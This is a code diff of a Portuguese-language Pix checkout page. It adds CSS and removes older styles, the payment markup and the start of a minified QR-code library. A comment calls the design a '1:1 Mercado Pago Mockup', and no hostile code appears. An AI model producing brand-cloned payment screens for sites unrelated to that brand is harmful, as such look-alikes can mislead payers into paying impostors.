+  align-items: center;
+  justify-content: center;
+  padding: 16px;
+}
+.cep-modal-backdrop[hidden] {
+  display: none !important;
+}
+.cep-modal-content {
+  background: #ffffff;
+  border-radius: 20px;
+  width: 100%;
+  max-width: 440px;
+  max-height: 90vh;
+  display: flex;
+  flex-direction: column;
+  box-shadow: 0 20px 40px rgba(0, 0, 0, 0.25);
+  overflow: hidden;
+  animation: modalFadeIn 0.2s ease-out;
+}
+@keyframes modalFadeIn {
+  from { opacity: 0; transform: scale(0.96); }
+  to { opacity: 1; transform: scale(1); }
+}
+.cep-modal-header {
+  padding: 16px 20px;
+  border-bottom: 1px solid #e2e8f0;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.cep-modal-header h3 {
+  margin: 0;
+  font-size: 17px;
+  font-weight: 700;
+  color: #0f172a;
+}
+.btn-close-modal {
+  background: none;
+  border: none;
+  font-size: 26px;
+  line-height: 1;
+  color: #64748b;
+  cursor: pointer;
+  padding: 4px;
+}
+.cep-modal-body {
+  padding: 18px 20px;
+  overflow-y: auto;
+}
+.cep-modal-desc {
+  font-size: 13.5px;
+  color: #475569;
+  margin: 0 0 14px;
+  line-height: 1.4;
+}
+.modal-form-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 10px;
+}
+.modal-field {
+  display: flex;
+  flex-direction: column;
+  gap: 4px;
+  text-align: left;
+}
+.modal-field label {
+  font-size: 12.5px;
+  font-weight: 600;
+  color: #334155;
+}
+.modal-input {
+  width: 100%;
+  height: 42px;
+  border: 1.5px solid #cbd5e1;
+  border-radius: 10px;
+  padding: 0 12px;
+  font-size: 14px;
+  color: #0f172a;
+  background: #f8fafc;
+  box-sizing: border-box;
+  font-family: inherit;
+}
+.modal-input:focus {
+  border-color: #009ee3;
+  outline: none;
+  background: #ffffff;
+  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.15);
+}
+.modal-cep-results {
+  margin-top: 14px;
+  display: flex;
+  flex-direction: column;
+  gap: 8px;
+  max-height: 200px;
+  overflow-y: auto;
+}
+.modal-cep-item {
+  padding: 10px 14px;
+  background: #f8fafc;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 12px;
+  cursor: pointer;
+  transition: all 0.15s ease;
+  text-align: left;
+}
+.modal-cep-item:hover {
+  background: #edf5ff;
+  border-color: #009ee3;
+}
+.modal-cep-item strong {
+  display: block;
+  font-size: 14px;
+  color: #009ee3;
+  margin-bottom: 2px;
+}
+.modal-cep-item span {
+  display: block;
+  font-size: 12.5px;
+  color: #475569;
+  line-height: 1.35;
+}
+
+/* Payment Methods */
+.payment-methods {
+  display: flex;
+  flex-direction: column;
+  gap: 12px;
+}
+.payment-card {
+  position: relative;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 16px 18px;
+  background: #ffffff;
+  border: 1.8px solid #e2e8f0;
+  border-radius: 14px;
+  box-shadow: 0 1px 3px rgba(0, 0, 0, 0.02);
+  transition: all 0.2s;
+  cursor: pointer;
+  width: 100%;
+  text-align: left;
+}
+.payment-card.active {
+  border: 2.2px solid #009ee3;
+  background: #ffffff;
+  box-shadow: 0 0 0 3px rgba(0, 158, 227, 0.12);
+}
+.payment-card-left {
+  display: flex;
+  align-items: center;
+  gap: 14px;
+}
+.pm-icon-wrap {
+  width: 44px;
+  height: 44px;
+  border-radius: 50%;
+  display: grid;
+  place-items: center;
+  flex-shrink: 0;
+}
+.pm-icon-wrap.pix {
+  background: #00bdae;
+  color: #ffffff;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.pm-icon-wrap.pix svg {
+  width: 24px;
+  height: 24px;
+  display: block;
+}
+.pm-icon-wrap.card {
+  background: #edf3f8;
+  color: #475569;
+}
+.pm-icon-wrap.wallet {
+  background: #edf3f8;
+  color: #475569;
+}
+.pm-texts h3 {
+  font-size: 16.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin: 0 0 2px;
+}
+.pm-texts p {
+  font-size: 14px;
+  font-weight: 500;
+  color: #475569;
+  margin: 0;
+}
+.pm-chevron {
+  color: #009ee3;
+}
+
+/* Botões Azuis: Grandes, Chamativos e Confortáveis */
+.btn-primary {
+  width: 100%;
+  height: 54px;
+  background: #009ee3;
+  color: #ffffff;
+  border-radius: 12px;
+  font-size: 17px;
+  font-weight: 700;
+  letter-spacing: 0.2px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-top: 20px;
+  box-shadow: 0 4px 14px rgba(0, 158, 227, 0.35);
+  transition: background 0.15s, transform 0.05s;
+}
+.btn-primary:hover {
+  background: #0084c2;
+}
+.btn-primary:active {
+  transform: scale(0.99);
+}
+.security-note {
+  display: flex;
+  align-items: flex-start;
+  justify-content: center;
+  gap: 9px;
+  margin-top: 14px;
+}
+.security-lock-icon {
+  width: 18px;
+  height: 18px;
+  min-width: 18px;
+  flex-shrink: 0;
+  margin-top: 2px;
+}
+.security-text-col {
+  display: flex;
+  flex-direction: column;
+  align-items: flex-start;
+  text-align: left;
+  line-height: 1.35;
+}
+.security-text-main {
+  color: #596579;
+  font-size: 13.5px;
+  font-weight: 400;
+  line-height: 1.35;
+}
+.security-link {
+  color: #009ee3;
+  font-size: 13.5px;
+  font-weight: 500;
+  text-decoration: none;
+  line-height: 1.35;
+  transition: color 0.15s ease, text-decoration 0.15s ease;
+}
+.security-link:hover {
+  text-decoration: underline;
+  color: #0084c2;
+}
+
+
+/* --- Pagamento Pix 1:1 Mercado Pago Mockup --- */
+.pix-headline {
+  margin-top: 4px;
+  margin-bottom: 14px;
+  text-align: left;
+}
+.pix-headline-title {
+  font-size: 23px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 5px;
+  line-height: 1.2;
+}
+.pix-headline-sub {
+  font-size: 13.5px;
+  font-weight: 400;
+  color: #64748b;
+  line-height: 1.4;
+  margin: 0;
+}
+
+/* Valor do pedido Banner */
+.order-value-banner {
+  background: #edf5ff;
+  border-radius: 16px;
+  padding: 16px 20px;
+  text-align: center;
+  margin-bottom: 16px;
+}
+.order-value-title {
+  display: block;
+  font-size: 13.5px;
+  font-weight: 500;
+  color: #475569;
+  margin-bottom: 4px;
+}
+.order-value-number {
+  display: block;
+  font-size: 29px;
+  font-weight: 800;
+  color: #0f172a;
+  line-height: 1.15;
+}
+
+/* QR Code Card - Compacto e Elegante */
+.pix-qr-card {
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 18px;
+  padding: 22px 18px 22px;
+  box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+  text-align: center;
+  margin-bottom: 16px;
+}
+
+/* Área do QR Code mais compacta para dar foco ao Copia e Cola */
+.qr-wrapper {
+  display: inline-flex;
+  align-items: center;
+  justify-content: center;
+  margin: 0 auto 16px;
+  padding: 10px;
+  background: #ffffff;
+  border: 1px solid #e2e8f0;
+  border-radius: 12px;
+  box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
+}
+.qr-code canvas, .qr-code svg, .qr-code img {
+  width: 145px !important;
+  height: 145px !important;
+  display: block;
+  border-radius: 4px;
+}
+.qr-helper-text {
+  font-size: 12.5px;
+  color: #64748b;
+  margin-bottom: 16px;
+  line-height: 1.3;
+}
+
+/* =========================================
+   BLOCO PIX COPIA E COLA (SUPER DESTACADO)
+   ========================================= */
+.pix-copia-cola-section {
+  background: #f0f7ff;
+  border: 2px solid #009ee3;
+  border-radius: 14px;
+  padding: 16px 14px;
+  margin-top: 6px;
+  box-shadow: 0 3px 12px rgba(0, 158, 227, 0.12);
+  text-align: left;
+}
+.copia-cola-badge-row {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  margin-bottom: 8px;
+}
+.copia-cola-badge {
+  display: inline-flex;
+  align-items: center;
+  gap: 5px;
+  background: #009ee3;
+  color: #ffffff;
+  font-size: 11.5px;
+  font-weight: 800;
+  text-transform: uppercase;
+  letter-spacing: 0.6px;
+  padding: 4px 9px;
+  border-radius: 6px;
+}
+.copia-cola-badge svg {
+  width: 13px;
+  height: 13px;
+}
+.copia-cola-sub {
+  font-size: 12px;
+  font-weight: 600;
+  color: #0284c7;
+}
+
+/* Botão Principal Gigante de Copiar Pix */
+.btn-copy-pix-main {
+  width: 100%;
+  height: 56px;
+  background: linear-gradient(180deg, #00a8f3 0%, #009ee3 100%);
+  color: #ffffff;
+  border-radius: 12px;
+  font-size: 17.5px;
+  font-weight: 800;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 10px;
+  margin-top: 10px;
+  margin-bottom: 10px;
+  box-shadow: 0 5px 18px rgba(0, 158, 227, 0.4);
+  cursor: pointer;
+  transition: all 0.2s ease;
+  border: none;
+  font-family: inherit;
+  letter-spacing: -0.2px;
+}
+.btn-copy-pix-main:hover {
+  background: #0084c2;
+  box-shadow: 0 6px 22px rgba(0, 158, 227, 0.5);
+  transform: translateY(-1px);
+}
+.btn-copy-pix-main:active {
+  transform: scale(0.98);
+}
+.btn-copy-pix-main.copied {
+  background: #00a650 !important;
+  box-shadow: 0 5px 18px rgba(0, 166, 80, 0.45) !important;
+}
+.copy-main-icon {
+  width: 24px;
+  height: 24px;
+  stroke: #ffffff;
+  flex-shrink: 0;
+}
+
+/* Caixa com o código clicável */
+.pix-code-container {
+  background: #ffffff;
+  border: 1.5px dashed #93c5fd;
+  border-radius: 10px;
+  padding: 10px 12px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  gap: 10px;
+  cursor: pointer;
+  transition: all 0.15s ease;
+}
+.pix-code-container:hover {
+  border-color: #009ee3;
+  background: #f8fafc;
+}
+.pix-copy-code-text {
+  font-size: 12px;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
+  line-height: 1.4;
+  color: #334155;
+  word-break: break-all;
+  display: -webkit-box;
+  -webkit-line-clamp: 2;
+  -webkit-box-orient: vertical;
+  overflow: hidden;
+  margin: 0;
+}
+.pix-code-copy-mini-hint {
+  font-size: 11.5px;
+  font-weight: 700;
+  color: #009ee3;
+  white-space: nowrap;
+  flex-shrink: 0;
+}
+
+/* Aguardando pagamento Notice */
+.waiting-payment-box {
+  background: #edf5ff;
+  border-radius: 14px;
+  padding: 14px 16px;
+  display: flex;
+  align-items: center;
+  gap: 14px;
+  margin-bottom: 16px;
+  text-align: left;
+}
+.waiting-icon {
+  width: 28px;
+  height: 28px;
+  min-width: 28px;
+  stroke: #009ee3;
+  flex-shrink: 0;
+}
+.waiting-content {
+  display: flex;
+  flex-direction: column;
+  gap: 2px;
+}
+.waiting-title {
+  font-size: 14.5px;
+  font-weight: 700;
+  color: #0284c7;
+  line-height: 1.25;
+}
+.waiting-desc {
+  font-size: 12.5px;
+  color: #64748b;
+  line-height: 1.35;
+  margin: 0;
+}
+
+/* Como pagar com Pix? Card */
+.how-to-pix-card {
+  background: #ffffff;
+  border: 1px solid #eef2f6;
+  border-radius: 16px;
+  padding: 18px 16px 14px;
+  box-shadow: 0 1px 4px rgba(0, 0, 0, 0.03);
+  margin-bottom: 24px;
+  text-align: left;
+}
+.how-to-pix-title {
+  font-size: 15.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 12px;
+}
+.how-to-pix-list {
+  display: flex;
+  flex-direction: column;
+}
+.how-to-pix-item {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 11px 0;
+  border-bottom: 1px solid #f1f5f9;
+}
+.how-to-pix-item:last-child {
+  border-bottom: none;
+}
+.how-to-item-left {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.how-to-step-badge {
+  width: 26px;
+  height: 26px;
+  min-width: 26px;
+  border-radius: 50%;
+  background: #e0f2fe;
+  color: #0284c7;
+  font-size: 13px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+}
+.how-to-step-text {
+  font-size: 13px;
+  color: #475569;
+  line-height: 1.3;
+}
+.how-to-chevron {
+  width: 17px;
+  height: 17px;
+  stroke: #64748b;
+  flex-shrink: 0;
+}
+
+/* Step 4 Pagamento Specifics */
+.pix-pay-card {
+  background: #ffffff;
+  border: 1.5px solid #e2e8f0;
+  border-radius: 18px;
+  padding: 24px 20px 28px;
+  text-align: center;
+  box-shadow: 0 2px 8px rgba(0, 0, 0, 0.03);
+}
+@media (min-width: 640px) {
+  .pix-pay-card {
+    background: #f8fafc;
+  }
+}
+.pix-pay-title {
+  font-size: 21px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 4px;
+}
+.pix-pay-desc {
+  font-size: 14px;
+  font-weight: 500;
+  color: #475569;
+  margin-bottom: 16px;
+}
+.qr-frame {
+  display: inline-flex;
+  padding: 14px;
+  background: #ffffff;
+  border: 2px solid #cbd5e1;
+  border-radius: 18px;
+  margin-bottom: 18px;
+  box-shadow: 0 4px 12px rgba(0, 0, 0, 0.04);
+}
+.qr-frame canvas, .qr-frame svg, .qr-frame img {
+  width: 190px;
+  height: 190px;
+  display: block;
+}
+
+.copy-input-block {
+  text-align: left;
+  margin-bottom: 14px;
+}
+.copy-label {
+  display: block;
+  font-size: 14px;
+  font-weight: 700;
+  color: #1e293b;
+  margin-bottom: 6px;
+}
+.copy-box {
+  display: flex;
+  align-items: center;
+  background: #ffffff;
+  border: 1.8px solid #cbd5e1;
+  border-radius: 12px;
+  overflow: hidden;
+  height: 50px;
+}
+.copy-box input {
+  flex: 1;
+  border: 0;
+  height: 100%;
+  padding: 0 14px;
+  font-size: 14px;
+  font-weight: 600;
+  color: #334155;
+  outline: none;
+  background: transparent;
+  min-width: 0;
+  white-space: nowrap;
+  overflow: hidden;
+  text-overflow: ellipsis;
+}
+.copy-inline-btn {
+  padding: 0 16px;
+  height: 100%;
+  display: flex;
+  align-items: center;
+  color: #009ee3;
+  border-left: 1.5px solid #e2e8f0;
+  background: #f8fafc;
+}
+
+.btn-copy-pix {
+  width: 100%;
+  height: 52px;
+  background: #009ee3;
+  color: #ffffff;
+  border-radius: 12px;
+  font-size: 17px;
+  font-weight: 700;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  gap: 8px;
+  margin-bottom: 16px;
+  box-shadow: 0 4px 14px rgba(0, 158, 227, 0.35);
+  transition: background 0.15s;
+}
+.btn-copy-pix svg {
+  width: 20px;
+  height: 20px;
+}
+.btn-copy-pix:hover {
+  background: #0084c2;
+}
+
+.amount-block {
+  margin-bottom: 16px;
+  text-align: center;
+}
+.amount-title {
+  display: block;
+  font-size: 14px;
+  font-weight: 600;
+  color: #64748b;
+  margin-bottom: 2px;
+}
+.amount-number {
+  font-size: 28px;
+  font-weight: 700;
+  color: #0f172a;
+}
+
+.instant-notice {
+  background: #eff6ff;
+  border: 1.5px solid #bfdbfe;
+  border-radius: 12px;
+  padding: 14px 16px;
+  display: flex;
+  align-items: center;
+  gap: 12px;
+  text-align: left;
+  margin-bottom: 20px;
+}
+.instant-icon {
+  color: #0284c7;
+  flex-shrink: 0;
+  display: flex;
+  align-items: center;
+}
+.instant-content strong {
+  display: block;
+  font-size: 14.5px;
+  font-weight: 700;
+  color: #0369a1;
+}
+.instant-content p {
+  font-size: 13.5px;
+  font-weight: 500;
+  color: #0284c7;
+  line-height: 1.35;
+}
+
+.how-to-block {
+  text-align: center;
+}
+.how-to-title {
+  font-size: 16.5px;
+  font-weight: 700;
+  color: #0f172a;
+  margin-bottom: 12px;
+  text-align: left;
+}
+.how-to-grid {
+  display: grid;
+  grid-template-columns: repeat(3, 1fr);
+  gap: 10px;
+}
+.how-item {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  text-align: center;
+}
+.how-badge {
+  width: 22px;
+  height: 22px;
+  border-radius: 6px;
+  background: #009ee3;
+  color: #ffffff;
+  font-size: 12px;
+  font-weight: 700;
+  display: grid;
+  place-items: center;
+  margin-bottom: 6px;
+}
+.how-icon-box {
+  width: 28px;
+  height: 28px;
+  display: grid;
+  place-items: center;
+  margin-bottom: 6px;
+}
+.how-item p {
+  font-size: 12.5px;
+  font-weight: 600;
+  color: #1e293b;
+  line-height: 1.35;
+}
+
+/* Toast Notification */
+.copy-toast {
+  position: fixed;
+  bottom: 24px;
+  left: 50%;
+  transform: translateX(-50%);
+  background: rgba(15, 23, 42, 0.95);
+  color: #ffffff;
+  padding: 12px 24px;
+  border-radius: 24px;
+  font-size: 15px;
+  font-weight: 700;
+  z-index: 9999;
+  box-shadow: 0 6px 18px rgba(0,0,0,0.22);
+}
 </style>
-<style>
-/* Spacing and proportions of the supplied payment reference. */
-.copy-backdrop{position:fixed;inset:0;z-index:999;background:radial-gradient(ellipse at center,#09101475 0%,#09101485 65%,#091014a0 100%);backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px);pointer-events:none;animation:copy-appear .14s ease-out}
-.copy-toast{position:fixed;z-index:1000;top:50%;left:50%;transform:translate(-50%,-50%);display:flex;flex-direction:column;align-items:center;gap:24px;width:250px;max-width:calc(100vw - 40px);padding:34px 20px 26px;border:1px solid #fff;border-radius:24px;background:#fff;color:#293344;font-size:19px;font-weight:700;line-height:1.35;text-align:center;box-shadow:0 24px 70px #0006,0 8px 24px #0003;pointer-events:none;animation:copy-appear .14s ease-out}
-.copy-toast::before{content:'';width:62px;height:62px;border-radius:50%;flex-shrink:0;background:url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M5 12l5 5L19 7' fill='none' stroke='white' stroke-width='3' stroke-linecap='round' stroke-linejoin='round'/%3E%3C/svg%3E") center/34px 34px no-repeat,linear-gradient(135deg,#0ba464,#00894e);box-shadow:0 0 0 14px #e8f8f1}
-@keyframes copy-appear{from{opacity:0}to{opacity:1}}
-@media(prefers-reduced-motion:reduce){.copy-backdrop,.copy-toast{animation:none}}
-#pixCode[data-live="true"]{cursor:pointer}
-.payment-content{background:transparent}
-.payment-shell{max-width:480px;padding:18px 24px 24px;background:transparent}
-.payment-status-card{min-height:0;padding:12px 16px 12px 24px;gap:14px;border-radius:18px}
-.payment-status-card::before{left:12px;top:16px;bottom:16px;width:2px;background:#f3c000}
-.hero-clock{width:72px;height:72px;border-width:8px}
-.hero-clock svg{width:44px;height:44px}
-.payment-hero h1{font-size:clamp(18px,4.8vw,24px);line-height:1.18;letter-spacing:-.65px;margin:0 0 6px}
-.payment-status-copy p{font-size:14px;line-height:1.4}
-.deadline{padding:12px 24px 10px;margin:10px 0;border-radius:18px}
-.deadline span{font-size:14px;color:#4b65a1}
-.deadline strong{font-size:43px;line-height:1.2;margin:4px 0 6px}
-.progress{height:6px;opacity:1;background:#b9e9df;margin:0;border-radius:8px}
-.progress span{height:100%;background:#45c996;border-radius:8px}
-.payment-content>section[aria-label="Pix copia e cola"]{padding:16px 15px 15px;margin-bottom:10px;border-radius:18px}
-.copy-heading{gap:18px;margin:0 4px 14px}
-.copy-heading>svg{width:42px;height:42px}
-.copy-heading h2{font-size:18px;line-height:1.3;letter-spacing:-.5px}
-.copy-heading p{font-size:13px;line-height:1.45;margin-top:4px}
-textarea{height:96px;padding:12px 50px 12px 14px;font-size:12px;line-height:1.5;border-radius:13px;color:#405d9b}
-.copy-icon{right:5px}
-.copy-button{min-height:49px;margin-top:10px;border-radius:13px;gap:16px;font-size:19px}
-.copy-feedback:empty{display:none}
-.code-trust{margin:22px 4px 2px;gap:12px;font-size:12px;line-height:1.5}
-.code-trust svg{width:30px;height:30px;padding:5px;background:#e9faf3;border-radius:50%;box-sizing:border-box}
-.qr-section{margin-bottom:10px;border-radius:18px}
-.qr-section summary{padding:13px 16px;gap:15px}
-.qr-summary>svg:first-child{width:29px;height:29px;padding:10px}
-.qr-summary h2{font-size:18px;line-height:1.3}
-.qr-summary p{font-size:13px;margin-top:4px;line-height:1.45}
-.tutorial{padding:12px 17px 15px;border-radius:18px}
-.tutorial-title{gap:19px;margin:0 0 9px}
-.tutorial-title>svg{width:27px;height:27px;padding:8px}
-.tutorial-title h2{font-size:18px}
-.steps{gap:9px}
-.steps li{gap:16px}
-.steps strong{width:32px;height:32px;font-size:18px}
-.steps:before{left:15px;border-left:1px solid #b3e1ff}
-.step-icon{width:33px;height:33px}
-.steps p{font-size:13px;line-height:1.5;color:#405d9b}
-.confirmation{margin-top:10px;padding:11px 18px;gap:16px;border-radius:18px}
-.confirmation svg{width:28px;height:28px}
-.confirmation p{font-size:11px;line-height:1.5}
-@media(max-width:400px){.payment-shell{padding:16px 14px 22px}.payment-status-card{padding-left:22px;gap:10px}.hero-clock{width:60px;height:60px;border-width:7px}.hero-clock svg{width:36px;height:36px}.payment-status-copy p{font-size:12px}.copy-heading{gap:13px}.copy-heading h2{font-size:16px}.copy-heading p{font-size:12px}.qr-summary h2,.tutorial-title h2{font-size:17px}}
-</style>
-<meta name="checkout-test-mode" content="boxes-11990"></head>
+</head>
 <body>
-<div id="copyBackdrop" class="copy-backdrop" aria-hidden="true" hidden></div>
-<div id="copyToast" class="copy-toast" role="status" aria-live="polite" aria-atomic="true" hidden></div>
-<main class="payment-shell" id="paymentCard">
-<header class="payment-hero">
-<div class="payment-status-card">
-<div class="hero-clock">
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<circle cx="12" cy="12" r="9"/>
-<path d="M12 6v6l4 2"/>
-</svg>
-</div>
-<div class="payment-status-copy">
-<h1 id="paymentStatus">Aguardando pagamento</h1>
-<p id="paymentMessage" role="status" aria-live="polite">Pague via Pix para concluir seu pedido.</p>
-</div>
-</div>
-<div class="deadline" hidden>
-<span id="timerLabel">Tempo sugerido para pagar</span>
-<strong id="countdown" role="timer" aria-label="Tempo sugerido para pagar">--:--</strong>
-<div class="progress" aria-hidden="true">
-<span id="timerProgress">
-</span>
-</div>
-</div>
-</header>
-<div class="payment-content">
-<section aria-label="Pix copia e cola">
-<div class="copy-heading">
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<path fill="currentColor" stroke="none" d="m12 1 5 5h-2l-3 3-3-3H7zm0 22-5-5h2l3-3 3 3h2zM6 7h3l3 3 3-3h3l5 5-5 5h-3l-3-3-3 3H6l-5-5z"/>
-</svg>
-<div>
-<h2>Código Pix (copia e cola)</h2>
-<p>Cole o código abaixo no seu banco ou app Pix.</p>
-</div>
-</div>
-<div class="code-box">
-<textarea id="pixCode" readonly aria-label="Código Pix" placeholder="O código aparecerá após a geração do Pix." spellcheck="false"></textarea>
-<button class="copy-icon" id="copyPixIcon" type="button" aria-label="Copiar código Pix" title="Copiar código Pix" disabled>
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<rect x="8" y="8" width="13" height="13" rx="2"/>
-<path d="M16 8V3H3v13h5"/>
-</svg>
-</button>
-</div>
-<button class="copy-button" id="copyPix" type="button" disabled>
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<rect x="6" y="2" width="12" height="20" rx="2"/>
-<path d="M10 18h4"/>
-</svg>
-<span id="copyLabel">Copiar código Pix</span>
-</button>
-<p class="copy-feedback" id="copyFeedback" role="status" aria-live="polite">
-</p>
-<p class="code-trust" hidden>
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<circle cx="12" cy="12" r="10" fill="currentColor" stroke="none"/>
-<path d="m7 12 3 3 7-7" stroke="white"/>
-</svg>Código seguro e válido apenas para este pedido.</p>
-<p class="expired-message" id="expiredMessage" role="status" hidden></p>
-</section>
-<details class="qr-section" hidden>
-<summary class="qr-summary">
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<rect x="2" y="2" width="7" height="7" rx="1"/>
-<rect x="15" y="2" width="7" height="7" rx="1"/>
-<rect x="2" y="15" width="7" height="7" rx="1"/>
-<path d="M5.5 5.5h.01m13 0h.01m-13 13h.01M12 12h3v3h3v6m-6-3v3m9-9v3m0 6h-3"/>
-</svg>
-<div>
-<h2>QR Code (opcional)</h2>
-<p>Escaneie com o app do seu banco.</p>
-</div>
-<svg class="chevron" viewBox="0 0 24 24" aria-hidden="true">
-<path d="m6 9 6 6 6-6"/>
-</svg>
-</summary>
-<div class="qr-body">
-<div class="qr-code"></div>Confira o valor e o recebedor no aplicativo do seu banco.</div>
-</details>
-<section class="tutorial">
-<div class="tutorial-title">
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<path d="M3 8V3h5m8 0h5v5M3 16v5h5m8 0h5v-5M7 12h10"/>
-</svg>
-<h2>Como pagar com Pix</h2>
-</div>
-<ol class="steps">
-<li>
-<strong>1</strong>
-<span class="step-icon">
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<rect x="6" y="2" width="12" height="20" rx="2"/>
-<path d="M10 18h4"/>
-</svg>
-</span>
-<p>Abra o app do seu banco</p>
-</li>
-<li>
-<strong>2</strong>
-<span class="step-icon">
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<path fill="currentColor" stroke="none" d="m12 1 5 5h-2l-3 3-3-3H7zm0 22-5-5h2l3-3 3 3h2zM6 7h3l3 3 3-3h3l5 5-5 5h-3l-3-3-3 3H6l-5-5z"/>
-</svg>
-</span>
-<p>Toque na área Pix</p>
-</li>
-<li>
-<strong>3</strong>
-<span class="step-icon">
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<rect x="5" y="3" width="14" height="19" rx="2"/>
-<path d="M9 3V1h6v2M9 7h6"/>
-</svg>
-</span>
-<p>Cole o código Pix copiado</p>
-</li>
-<li>
-<strong>4</strong>
-<span class="step-icon">
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<path d="m4 12 5 5L20 6"/>
-</svg>
-</span>
-<p>Confirme o pagamento</p>
-</li>
-</ol>
-</section>
-<div class="confirmation">
-<svg viewBox="0 0 24 24" aria-hidden="true">
-<circle cx="12" cy="12" r="10"/>
-<path d="M12 11v6m0-10v.01"/>
-</svg>
-<p>A confirmação do pagamento pode levar alguns minutos. Esta página será atualizada assim que o pagamento for confirmado.</p>
-</div>
-<noscript>Ative o JavaScript no navegador para consultar seu pagamento.</noscript>
-<a class="back" href="../checkout/">Voltar ao checkout</a>
-</div>
-</main><!-- generated:payment:start -->
-<script>
-(()=>{var gn=Object.create;var Ze=Object.defineProperty;var hn=Object.getOwnPropertyDescriptor;var pn=Object.getOwnPropertyNames;var mn=Object.getPrototypeOf,yn=Object.prototype.hasOwnProperty;var g=(t,e)=>()=>(e||t((e={exports:{}}).exports,e),e.exports);var wn=(t,e,n,o)=>{if(e&&typeof e=="object"||typeof e=="function")for(let r of pn(e))!yn.call(t,r)&&r!==n&&Ze(t,r,{get:()=>e[r],enumerable:!(o=hn(e,r))||o.enumerable});return t};var Cn=(t,e,n)=>(n=t!=null?gn(mn(t)):{},wn(e||!t||!t.__esModule?Ze(n,"default",{value:t,enumerable:!0}):n,t));var tt=g((Po,et)=>{et.exports=function(){return typeof Promise=="function"&&Promise.prototype&&Promise.prototype.then}});var x=g(M=>{var pe,En=[0,26,44,70,100,134,172,196,242,292,346,404,466,532,581,655,733,815,901,991,1085,1156,1258,1364,1474,1588,1706,1828,1921,2051,2185,2323,2465,2611,2761,2876,3034,3196,3362,3532,3706];M.getSymbolSize=function(e){if(!e)throw new Error('"version" cannot be null or undefined');if(e<1||e>40)throw new Error('"version" should be in range from 1 to 40');return e*4+17};M.getSymbolTotalCodewords=function(e){return En[e]};M.getBCHDigit=function(t){let e=0;for(;t!==0;)e++,t>>>=1;return e};M.setToSJISFunction=function(e){if(typeof e!="function")throw new Error('"toSJISFunc" is not a valid function.');pe=e};M.isKanjiModeEnabled=function(){return typeof pe<"u"};M.toSJIS=function(e){return pe(e)}});var ee=g(w=>{w.L={bit:1};w.M={bit:0};w.Q={bit:3};w.H={bit:2};function In(t){if(typeof t!="string")throw new Error("Param is not a string");switch(t.toLowerCase()){case"l":case"low":return w.L;case"m":case"medium":return w.M;case"q":case"quartile":return w.Q;case"h":case"high":return w.H;default:throw new Error("Unknown EC Level: "+t)}}w.isValid=function(e){return e&&typeof e.bit<"u"&&e.bit>=0&&e.bit<4};w.from=function(e,n){if(w.isValid(e))return e;try{return In(e)}catch{return n}}});var rt=g((xo,ot)=>{function nt(){this.buffer=[],this.length=0}nt.prototype={get:function(t){let e=Math.floor(t/8);return(this.buffer[e]>>>7-t%8&1)===1},put:function(t,e){for(let n=0;n<e;n++)this.putBit((t>>>e-n-1&1)===1)},getLengthInBits:function(){return this.length},putBit:function(t){let e=Math.floor(this.length/8);this.buffer.length<=e&&this.buffer.push(0),t&&(this.buffer[e]|=128>>>this.length%8),this.length++}};ot.exports=nt});var st=g((To,it)=>{function v(t){if(!t||t<1)throw new Error("BitMatrix size must be defined and greater than 0");this.size=t,this.data=new Uint8Array(t*t),this.reservedBit=new Uint8Array(t*t)}v.prototype.set=function(t,e,n,o){let r=t*this.size+e;this.data[r]=n,o&&(this.reservedBit[r]=!0)};v.prototype.get=function(t,e){return this.data[t*this.size+e]};v.prototype.xor=function(t,e,n){this.data[t*this.size+e]^=n};v.prototype.isReserved=function(t,e){return this.reservedBit[t*this.size+e]};it.exports=v});var at=g(te=>{var Sn=x().getSymbolSize;te.getRowColCoords=function(e){if(e===1)return[];let n=Math.floor(e/7)+2,o=Sn(e),r=o===145?26:Math.ceil((o-13)/(2*n-2))*2,i=[o-7];for(let s=1;s<n-1;s++)i[s]=i[s-1]-r;return i.push(6),i.reverse()};te.getPositions=function(e){let n=[],o=te.getRowColCoords(e),r=o.length;for(let i=0;i<r;i++)for(let s=0;s<r;s++)i===0&&s===0||i===0&&s===r-1||i===r-1&&s===0||n.push([o[i],o[s]]);return n}});var lt=g(ut=>{var Pn=x().getSymbolSize,ct=7;ut.getPositions=function(e){let n=Pn(e);return[[0,0],[n-ct,0],[0,n-ct]]}});var dt=g(h=>{h.Patterns={PATTERN000:0,PATTERN001:1,PATTERN010:2,PATTERN011:3,PATTERN100:4,PATTERN101:5,PATTERN110:6,PATTERN111:7};var 